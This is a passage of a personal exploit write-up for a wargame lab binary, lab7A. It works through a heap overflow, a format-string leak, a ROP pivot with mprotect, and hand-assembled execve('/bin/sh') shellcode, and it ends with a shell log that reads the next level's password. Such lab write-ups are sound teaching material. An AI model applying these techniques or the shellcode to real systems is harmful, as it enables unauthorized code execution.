+After overflowing the first message and thus overwriting the second message with printf_ptr+"YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"
+[screenshot here]
+
+the heap itself, at the time, looks more-less like this:
+
+gdb-peda$ x/100wx 0x080f1ae8
+0x80f1ae8:      0x08050260      0x59595959      0x59595959      0x59595959
+0x80f1af8:      0x59595959      0x59595959      0x59595959      0x59595959
+0x80f1b08:      0x59595959      0x0d0a5959      0x278e4996      0x16ac1d49
+
+whereas 0x08050260 (at 0x80f1ae8) is the printf()'s address we just put there and now called (remember, the first dword of the structure is its print_message function address), while the string of 0x59 are the "Y"s. They are not XOR-ed, as the original XOR-ed content of the second message, coming from create_message()/edit_message() functions, was just overwritten with whatever we control.
+So, corb3nik in corb3nik's solution the string provided was "...%20$p..." - which I did not understand at the first glance. So basically, by calling printf() with an arbitrary string as the first argument, he created a format string condition, telling printf() to read further from the stack, pass the message pointer, pass any nullbytes on the way and print the value of an arbitary pointer specified by the numer expression (%20$p), which is a conjunction of %p (pointer) and 20$ (20-th position from the stack):
+
+   0x8050260 <printf>:  sub    esp,0x1c
+   0x8050263 <printf+3>:        lea    eax,[esp+0x24]
+=> 0x8050267 <printf+7>:        mov    DWORD PTR [esp+0x8],eax
+
+
+gdb-peda$ x/100wx $esp
+0xbffff610:     0x080edee0      0x080c0670      0xbffff634      0x080481a8
+0xbffff620:     0x00000000      0x080ecfbc      0xbffff678      0x08049521
+0xbffff630:     0x080f1ae8      0x00000000      0x0000000a      0x080ed240
+0xbffff640:     0x080ed240      0x00000029      0x00000001      0x08000a31
+0xbffff650:     0x080ed240      0x0000000a      0x00000029      0x08050280
+0xbffff660:     0x080ed240      0x080c085e      0x00000004      0x91e11b00
+0xbffff670:     0x00000000      0x080ecfbc      0xbffff6a8      0x0804967e
+0xbffff680:     0x080c0870      0x00000000      0x00000002      0x00000000
+0xbffff690:     0x080ed014      0xbffff734      0x00000004      0x91e11b00
+0xbffff6a0:     0x00000000      0x080ecfbc      0x08049e70      0x080498ba
+0xbffff6b0:     0x00000001      0xbffff734      0xbffff73c      0x00000000
+0xbffff6c0:     0x00000000      0x080481a8      0x00000000      0x080ecfbc
+0xbffff6d0:     0x08049e70      0x58d14609      0xae0cd766      0x00000000
+0xbffff6e0:     0x00000000      0x00000000      0x00000000      0x00000000
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x08048000 0x080ec000 r-xp      /levels/lab07/lab7A
+0x080ec000 0x080ee000 rw-p      /levels/lab07/lab7A
+0x080ee000 0x08112000 rw-p      [heap]
+0xb7ffc000 0xb7ffd000 rw-p      mapped
+0xb7ffd000 0xb7ffe000 r-xp      [vdso]
+0xb7ffe000 0xb8000000 r--p      [vvar]
+0xbffdf000 0xc0000000 rw-p      [stack]
+
+And the address we want is here:
+gdb-peda$ x/100wx $esp
+0xbffff610:     0x080edee0      0x080c0670      0xbffff634      0x080481a8
+0xbffff620:     0x00000000      0x080ecfbc      0xbffff678      0x08049521
+0xbffff630:     0x080f1ae8      <-- here
+
+I saw that corb3nik did call printf() by first explicitly calling print_index() via this overflow, probably to groom the stack with the proper value, however to me this seemed like an overcomplication, so I decided to go simpler route and leak the address found above. As a matter of fact, this address looks like a good place to store our payload (ROP chain/shellcode, depending on what scenario we will be getting execve()). All we'll need to do is to edit the first messsage once again after this leak and then ask the program to 'print' the second message.
+
+gdb-peda$ x/100wx $esp
+0xbffff630:     0x080f1ae8      0x00000000      0x0000000a      0x080ed240
+0xbffff640:     0x080ed240      0x00000029      0x00000001      0x08000a31
+0xbffff650:     0x080ed240      0x0000000a      0x00000029      0x08050280
+0xbffff660:     0x080ed240      0x080c085e      0x00000004      0xf991a600
+0xbffff670:     0x00000000      0x080ecfbc      0xbffff6a8      0x0804967e
+0xbffff680:     0x080c0870      0x00000000      0x00000002      0x00000000
+
+Fuck, the problem is that at the time of call the heap address is, from printf()'s perspective, at index 0. And I am afraid printf() might not support this value as an index (to prevent leaks exactly).
+
+Yup, this is why corb3nik groomed the stack by calling print_index -> print_index -> printf() instead of print_index->printf() we are trying to do here. It has to be done his way.
+
+OK, let's do this.
+
+Stack in the first call:
+
+Breakpoint 1, 0x0804951f in print_index ()
+gdb-peda$ x/100wx $esp
+0xbffff630:     0x080f1ae8      0x00000000      0x0000000a      0x080ed240
+0xbffff640:     0x080ed240      0x00000029      0x00000001      0x08000a31
+0xbffff650:     0x080ed240      0x0000000a      0x00000029      0x08050280
+0xbffff660:     0x080ed240      0x080c085e      0x00000004      0xca769b00
+0xbffff670:     0x00000000      0x080ecfbc      0xbffff6a8      0x0804967e
+0xbffff680:     0x080c0870      0x00000000      0x00000002      0x00000000
+0xbffff690:     0x080ed014      0xbffff734      0x00000004      0xca769b00
+0xbffff6a0:     0x00000000      0x080ecfbc      0x08049e70      0x080498ba
+0xbffff6b0:     0x00000001      0xbffff734      0xbffff73c      0x00000000
+
+Stack in the second call:
+
+Breakpoint 1, 0x0804951f in print_index ()
+gdb-peda$ x/100wx $esp
+0xbffff5e0:     0x080f1d08      0x00000000      0x0000000a      0x080481a8
+0xbffff5f0:     0x00000000      0x080ecfbc      0x00000003      0x08000a33
+0xbffff600:     0xbffff64c      0x00000000      0x0000000a      0x00000000
+0xbffff610:     0x080edee0      0x080c0670      0xbffff634      0xca769b00
+0xbffff620:     0x00000000      0x080ecfbc      0xbffff678      0x08049521
+0xbffff630:     0x080f1ae8      0x00000000      0x0000000a      0x080ed240
+0xbffff640:     0x080ed240      0x00000029      0x00000001      0x08000a31
+0xbffff650:     0x080ed240      0x0000000a      0x00000029      0x08050280
+0xbffff660:     0x080ed240      0x080c085e      0x00000004      0xca769b00
+0xbffff670:     0x00000000      0x080ecfbc      0xbffff6a8      0x0804967e
+0xbffff680:     0x080c0870      0x00000000      0x00000002      0x00000000
+0xbffff690:     0x080ed014      0xbffff734      0x00000004      0xca769b00
+0xbffff6a0:     0x00000000      0x080ecfbc      0x08049e70      0x080498ba
+0xbffff6b0:     0x00000001      0xbffff734      0xbffff73c      0x00000000
+0xbffff6c0:     0x00000000      0x080481a8      0x00000000      0x080ecfbc
+0xbffff6d0:     0x08049e70      0xca00316d      0x3cdda002      0x00000000
+
+Great. Now we want prinf() call to print 0xbffff630 (0x080f1ae8):
+
+...
+
+`\x0LEAK:0x80f1ae8:KEAL
+k\x9d[\x18~h3IW+\x12\xa0v+      {m      \xb7,g\xb9m5\xfe<\x9eIwE\x86+\xbfMO\x1bo\x859\xb48\x12Z'i;]\xa1\x03\x81gsYv
++---------------------------------------+
+|        Doom's OTP Service v1.0        |
++---------------------------------------+
+|------------ Services Menu ------------|
+|---------------------------------------|
+| 1. Create secure message              |
+| 2. Edit secure message                |
+| 3. Destroy secure message             |
+| 4. Print message details              |
+| 5. Quit                               |
++---------------------------------------+
+
+So yeah, the exploit now prints 0x80f1ae8.
+
+The heap:
+
+gdb-peda$ x/300wx 0x080f1ae8
+0x80f1ae8:      0x08049481      0x2d629f0a      0x7faf78c4      0x4c24bed8
+0x80f1af8:      0x578ea6c2      0x7da970e7      0x19f98029      0x1657729d
+0x80f1b08:      0x0a274592      0x6fd05da0      0x44977a61      0x7c3e254b
+0x80f1b18:      0x4c6becc8      0x1b70d21a      0x1c709a6d      0x320a3244
+0x80f1b28:      0x39bf1da3      0x2fe70d43      0x64c93d5b      0x3472bff1
+0x80f1b38:      0x5f7b6e2b      0x6271fa31      0x016893b0      0x7c00463a
+0x80f1b48:      0x04d707ca      0x275b7093      0x282db783      0x6d5506cf
+0x80f1b58:      0x606896a3      0x78dfb053      0x5bbfbfc9      0x5e715f13
+0x80f1b68:      0x26424fb7      0x6f20dd26      0x3ded3a86      0x0e66fc9a
+0x80f1b78:      0x15cce480      0x3feb32a5      0x5bbbc26b      0x541530df
+0x80f1b88:      0x486507d0      0x2d921fe2      0x06d53823      0x3e7c6709
+0x80f1b98:      0x0e29ae8a      0x1b709058      0x1c709a6d      0x320a3244
+0x80f1ba8:      0x39bf1da3      0x2fe70d43      0x64c93d5b      0x3472bff1
+0x80f1bb8:      0x5f7b6e2b      0x6271fa31      0x016893b0      0x7c00463a
+0x80f1bc8:      0x04d707ca      0x275b7093      0x282db783      0x6d5506cf
+0x80f1bd8:      0x606896a3      0x78dfb053      0x5bbfbfc9      0x5e715f13
+0x80f1be8:      0x26424fb7      0x00000032      0x00000000      0x00000111
+0x80f1bf8:      0x08048fd3      0x5b6f388d      0x2a961deb      0x7dd0f679
+0x80f1c08:      0x5918a974      0x448f9e14      0x14286917      0x633fef06
+0x80f1c18:      0x345ffbb4      0x58bfe378      0x5f7e1451      0x00cbe87d
+0x80f1c28:      0x7430b593      0x7beeaebe      0x32d61ac1      0x2defd336
+0x80f1c38:      0x2bd5bc02      0x179f581c      0x62629328      0x0b512a2d
+0x80f1c48:      0x7a11524e      0x63cb26d8      0x07517067      0x7ee85a18
+0x80f1c58:      0x0b26976c      0x2f7f27ea      0x6c3d60e7      0x6b8f2e0f
+0x80f1c68:      0x285ed83d      0x47fd20b0      0x4a008d22      0x4ea127f4
+0x80f1c78:      0x236c593d      0x1a2e79cc      0x6bd75caa      0x3c91b738
+0x80f1c88:      0x1859e835      0x05cedf55      0x55692856      0x227eae47
+0x80f1c98:      0x751ebaf5      0x19fea239      0x1e3f5510      0x418aa93c
+0x80f1ca8:      0x3571f4d2      0x3aafefff      0x73975b80      0x6cae9277
+0x80f1cb8:      0x6a94fd43      0x56de195d      0x2323d269      0x4a106b6c
+0x80f1cc8:      0x3b50130f      0x228a6799      0x46103126      0x3fa91b59
+0x80f1cd8:      0x4a67d62d      0x6e3e66ab      0x2d7c21a6      0x2ace6f4e
+0x80f1ce8:      0x691f997c      0x06bc61f1      0x0b41cc63      0x0fe066b5
+0x80f1cf8:      0x622d187c      0x43434343      0x42424242      0x42424242
+0x80f1d08:      0x08050260      0x4b41454c      0x3032253a      0x4b3a7024
+0x80f1d18:      0x414c4145      0x41414141      0x41414141      0x41414141
+0x80f1d28:      0x41414141      0x41414141      0x41414141      0x41414141
+0x80f1d38:      0x41414141      0x41414141      0x41414141      0x41414141
+0x80f1d48:      0x41414141      0x41414141      0x41414141      0x41414141
+0x80f1d58:      0x41414141      0x41414141      0x41414141      0x41414141
+0x80f1d68:      0x41414141      0x41414141      0x41414141      0x41414141
+0x80f1d78:      0x41414141      0x0a414141      0x20293379      0x0968276b
+0x80f1d88:      0x56f5ab73      0x36d4e94f      0x0e305c2c      0x3ec740f3
+0x80f1d98:      0x7b640b60      0x22d8c5c7      0x1d86b3f5      0x2fc40694
+0x80f1da8:      0x7b1828bf      0x7d01444a      0x2c106f11      0x6fc962d2
+0x80f1db8:      0x7973f684      0x21280a56      0x5b7af3c7      0x670770c8
+0x80f1dc8:      0x38c7a031      0x3ddd86ef      0x72589af5      0x32d8f27f
+0x80f1dd8:      0x21a8adc7      0x79aa0b5d      0x31c14c97      0x2ccf4533
+0x80f1de8:      0x29293347      0x1dfead7e      0x185e7343      0x51880b85
+0x80f1df8:      0x65fbce2e      0x625f0065      0x20293379      0x0968276b
+0x80f1e08:      0x56f5ab73      0x00000032      0x00000000      0x000201f1
+0x80f1e18:      0x00000000      0x00000000      0x00000000      0x00000000
+
+We can see that our leaked address is 0x80f1ae8 (second message), while our shellcode holder starts at 0x80f1d1a.
+
+gdb-peda$ p 0x80f1d1a-0x80f1ae8
+$2 = 0x232
+
+So, we'll add 0x232 to get our shellcode address on the heap once we go down with exploitation.
+
+Fuck :P
+
+ROPeMe> search mov esp ?
+Searching for ROP gadget:  mov esp ? with constraints: []
+0x806a4d1L: mov esp 0x5ff801c0 ;;
+0x80bd486L: mov esp ecx ;;
+0x80bd536L: mov esp ecx ;;
+0x80bd5f3L: mov esp ecx ;;
+
+gdb-peda$ x/5i 0x80bd536
+   0x80bd536 <_Unwind_ForcedUnwind+166>:        mov    esp,ecx
+   0x80bd538 <_Unwind_ForcedUnwind+168>:        ret
+ 
+
+
+Legend: code, data, rodata, value
+0x0806f340 in mprotect ()
+gdb-peda$ x/100wx $esp
+0xbffff651:     0x080649eb      0x080f1d1a      0x00000064      0x00000007
+0xbffff661:     0x5e08000a      0x04080c08      0x00000000      0x00a61f2c
+0xbffff671:     0xbc000000      0xa8080ecf      0x7ebffff6      0x70080496
+0xbffff681:     0x00080c08      0x02000000      0x00000000      0x14000000
+0xbffff691:     0x34080ed0      0x04bffff7      0x00000000      0x00a61f2c
+0xbffff6a1:     0xbc000000      0x70080ecf      0xba08049e      0x01080498
+0xbffff6b1:     0x34000000      0x3cbffff7      0x00bffff7      0x00000000
+0xbffff6c1:     0xa8000000      0x00080481      0xbc000000      0x70080ecf
+0xbffff6d1:     0xf508049e      0x9a415b62      0x00b786f3      0x00000000
+0xbffff6e1:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff6f1:     0x00000000      0x00000000      0x00000000      0x01000000
+0xbffff701:     0x00000000      0x00000000      0x4b000000      0x6908048d
+0xbffff711:     0x01080495      0x34000000      0xd0bffff7      0x7008049d
+0xbffff721:     0x0008049e      0x2c000000      0x00bffff7      0x01000000
+0xbffff731:     0x5d000000      0x00bffff8      0x71000000      0x91bffff8
+0xbffff741:     0xb2bffff8      0xc0bffff8      0xcbbffff8      0x29bffff8
+0xbffff751:     0x3abffff9      0x9dbffff9      0xaebffff9      0xc3bffff9
+0xbffff761:     0xd3bffff9      0xdbbffff9      0xfabffff9      0x0bbffff9
+0xbffff771:     0x1dbffffa      0x2fbffffa      0x61bffffa      0x83bffffa
+0xbffff781:     0x96bffffa      0xa9bffffa      0xb2bffffa      0xc7bffffa
+0xbffff791:     0x00bffffa      0x20000000      0x3c000000      0x21b7ffdd
+0xbffff7a1:     0x00000000      0x10b7ffd0      0xff000000      0x06078bfb
+0xbffff7b1:     0x00000000      0x11000010      0x64000000      0x03000000
+0xbffff7c1:     0x34000000      0x04080480      0x20000000      0x05000000
+0xbffff7d1:     0x06000000      0x07000000      0x00000000      0x08000000
+gdb-peda$ x/200wx 0x080f1d1a
+0x80f1d1a:      0xcccccc4c      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d2a:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d3a:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d4a:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d5a:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d6a:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d7a:      0xcccccccc      0xf4230acc      0x3a4719fc      0xe7fa1095
+
+
+Legend: code, data, rodata, value
+0x080649ee in __memcmp_ssse3 ()
+gdb-peda$ x/100wx $esp
+0xbffff661:     0x5e08000a      0x04080c08      0x00000000      0x00a61f2c
+0xbffff671:     0xbc000000      0xa8080ecf      0x7ebffff6      0x70080496
+
+OK, when doing return from the pop3ret the value on the stack is bad. Should be our shellcode address.
+
+gdb-peda$ x/200wx 0x080f1d1a
+0x80f1d1a:      0xcccccc4c      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d2a:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
+0x80f1d3a:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
+
+
+gdb-peda$ x/100wx $esp
+0xbffff655:     0x080f1d1a      0x00000064      0x00000007      0x080f1d1a
+0xbffff665:     0x0408000a      0x00000000      0x001bfbd6      0xbc000000
+
+
+gdb-peda$ x/10i 0x080f1d1a
+   0x80f1d1a:   dec    esp
+   0x80f1d1b:   int3
+   0x80f1d1c:   int3
+   0x80f1d1d:   int3
+   0x80f1d1e:   int3
+   0x80f1d1f:   int3
+   0x80f1d20:   int3
+   0x80f1d21:   int3
+   0x80f1d22:   int3
+   0x80f1d23:   int3
+   
+ Looks good to me. Just unsure whether that mprotect() was successful:
+ 
+ 
+Start      End        Perm      Name
+0x08048000 0x080ec000 r-xp      /levels/lab07/lab7A
+0x080ec000 0x080ee000 rw-p      /levels/lab07/lab7A
+0x080ee000 0x08112000 rw-p      [heap]
+0xb7ffc000 0xb7ffd000 rw-p      mapped
+0xb7ffd000 0xb7ffe000 r-xp      [vdso]
+0xb7ffe000 0xb8000000 r--p      [vvar]
+
+
+This is where we're gonna crash:
+
+gdb-peda$ break *0x080f1d1b
+Breakpoint 2 at 0x80f1d1b
+gdb-peda$ c
+Continuing.
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffffff
+EBX: 0x7
+ECX: 0x80f0840 (0x080f0840)
+EDX: 0x7
+ESI: 0x64 ('d')
+EDI: 0x80f1d1b --> 0x90909090
+EBP: 0xbffff678 --> 0xbffff6a8 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffff665 --> 0x408000a
+EIP: 0x80f1d1b --> 0x90909090
+EFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80f1d16:   cmp    cl,BYTE PTR [ebx+0x45]
+   0x80f1d19:   inc    ecx
+   0x80f1d1a:   dec    esp
+=> 0x80f1d1b:   nop
+   0x80f1d1c:   nop
+   0x80f1d1d:   nop
+   0x80f1d1e:   nop
+   0x80f1d1f:   nop
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff665 --> 0x408000a
+0004| 0xbffff669 --> 0x0
+0008| 0xbffff66d --> 0xfb3332
+0012| 0xbffff671 --> 0xbc000000
+0016| 0xbffff675 --> 0xa8080ecf
+0020| 0xbffff679 --> 0x7ebffff6
+0024| 0xbffff67d --> 0x70080496
+0028| 0xbffff681 --> 0x80c08
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x080f1d1b in ?? ()
+
+
+
+EAX contains 0xffffffff (-1), from mprotect(). Why did mprotect() fail? Maybe the size is too small. Let's try making the entire heap executable.
+
+So I changed the call to embrace the entire heap (which I did not want):
+    rop_shell=p32(mprotect_addr)+p32(pop3ret)+p32(0x080ee000)+p32(0x24000)+p32(0x7)
+	
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x08048000 0x080ec000 r-xp      /levels/lab07/lab7A
+0x080ec000 0x080ee000 rw-p      /levels/lab07/lab7A
+0x080ee000 0x08112000 rwxp      [heap] <---- !!! EXECUTABLE !!!
+0xb7ffc000 0xb7ffd000 rw-p      mapped
+0xb7ffd000 0xb7ffe000 r-xp      [vdso]
+0xb7ffe000 0xb8000000 r--p      [vvar]
+0xbffdf000 0xc0000000 rw-p      [stack]
+
+   0x80f1d7c:   nop
+   0x80f1d7d:   nop
+   0x80f1d7e:   nop
+=> 0x80f1d7f:   or     bh,BYTE PTR [ebx]
+   0x80f1d81:   (bad)
+   0x80f1d82:   iret
+   0x80f1d83:   jge    0x80f1e01
+   0x80f1d85:   dec    BYTE PTR [edx+0x72]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff665 --> 0x408000a
+0004| 0xbffff669 --> 0x0
+0008| 0xbffff66d --> 0x95f5a1
+0012| 0xbffff671 --> 0xbc000000
+0016| 0xbffff675 --> 0xa8080ecf
+0020| 0xbffff679 --> 0x7ebffff6
+0024| 0xbffff67d --> 0x70080496
+0028| 0xbffff681 --> 0x80c08
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x080f1d7f in ?? ()
+
+OK, awesome, it went down our NOP-sled.
+
+We can pack our shellcode now.
+
+But before we do that... well, I would love to know why mprotect() failed earlier.
+
+BTW, vmmap for the heap in the target process looks the same:
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x08048000 0x080ec000 r-xp      /levels/lab07/lab7A
+0x080ec000 0x080ee000 rw-p      /levels/lab07/lab7A
+0x080ee000 0x08112000 rw-p      [heap]
+0xb7ffc000 0xb7ffd000 rw-p      mapped
+0xb7ffd000 0xb7ffe000 r-xp      [vdso]
+0xb7ffe000 0xb8000000 r--p      [vvar]
+0xbffdf000 0xc0000000 rw-p      [stack]
+
+OK, the shellcode now:
+As far as I remember it should look like:
+
+eax = 0xb
+ebx = string
+ecx = 0
+edx = 0
+int 0x80
+
+We have plenty of space and no bad character constraints, so we don't need trickery.
+/bin/sh:
+2f62696e
+2f736800
+
+Building this using shellnoob:
+
+1. Push the string on the stack
+>> push $0x0068732f
+push $0x0068732f ~> 682f736800
+
+>> push $0x6e69622f
+push 0x2f62696e ~> 682f62696e
+
+2. Push the pointer to the string to the stack
+push esp
+>> push %esp
+push %esp ~> 54
+
+3. Pop it to ebx, setting the first and most important argument
+pop ebx
+>> pop %ebx
+pop %ebx ~> 5b
+
+4. Push 0xb (11, number of the execve() syscall on x86) to the stack
+>> push $0xb
+push $0xb ~> 6a0b
+
+5. Pop it to eax, setting the eax register for int 0x80
+pop eax
+>> pop %eax
+pop %eax ~> 58
+
+6. Zero ecx
+xor ecx, ecx
+>> xor %ecx, %ecx
+xor %ecx, %ecx ~> 31c9
+
+7. Zero edx
+xor edx, edx
+>> xor %edx, %edx
+xor %edx, %edx ~> 31d2
+
+8. Call the software interrrupt
+int 0x80
+>> int $0x80
+int $0x80 ~> cd80
+
+
+
+682f736800
+682f62696e
+54
+5b
+6a0b
+58
+31c9
+31d2
+cd80
+
+\x68\x2f\x73\x68\x00
+\x68\x2f\x62\x69\x6e
+\x54
+\x5b
+\x6a\x0b
+\x58
+\x31\xc9
+\x31\xd2
+\xcd\x80
+
+gdb-peda$ x/100wx 0x080f1d1b
+0x80f1d1b:      0x680035ff      0x35ff2f73      0x2f62696e      0x0b6a5b54
+0x80f1d2b:      0x31c93158      0x9080cddb      0x90909090      0x90909090
+0x80f1d3b:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80f1d4b:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80f1d5b:      0x90909090      0x90909090      0x90909090      0x90909090
+0x80f1d6b:      0x90909090      0x90909090      0x90909090      0x90909090
+
+Yup, it works.
+
+Now I would like to know why the fuck did not mprotect() work on that smaller chunk of the heap.
+
+    '-Input message index to print: '
+[DEBUG] Sent 0x1a bytes:
+    00000000  31 40 f3 06  08 eb 49 06  08 00 e0 0e  08 00 40 02  │1@··│··I·│····│··@·│
+    00000010  00 07 00 00  00 1b 1d 0f  08 0a                     │····│····│··│
+    0000001a
+[*] Switching to interactive mode
+$ id
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x48 bytes:
+    'uid=1028(lab7end) gid=1029(lab7end) groups=1029(lab7end),1001(gameuser)\n'
+uid=1028(lab7end) gid=1029(lab7end) groups=1029(lab7end),1001(gameuser)
+$ cat /home/lab7end/.pass
+[DEBUG] Sent 0x18 bytes:
+    'cat /home/lab7end/.pass\n'
+[DEBUG] Received 0x22 bytes:
+    '0verfl0wz_0n_th3_h3ap_4int_s0_bad\n'
+0verfl0wz_0n_th3_h3ap_4int_s0_bad
+[*] Got EOF while reading in interactive
+
+
